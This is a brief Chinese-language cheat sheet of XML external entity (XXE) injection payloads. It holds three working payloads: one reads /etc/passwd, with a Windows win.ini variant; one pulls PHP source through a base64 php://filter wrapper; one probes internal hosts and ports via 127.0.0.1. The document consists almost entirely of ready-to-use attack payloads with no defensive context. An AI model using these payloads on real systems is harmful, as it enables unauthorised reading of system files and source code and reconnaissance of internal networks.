基础任意文件读取
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
##如果是windows把路径换成file:///C:/Windows/win.ini

读取PHP源码（结果可能要base64解码）
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>

内网探测与端口扫描
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
]>
<root>&xxe;</root>





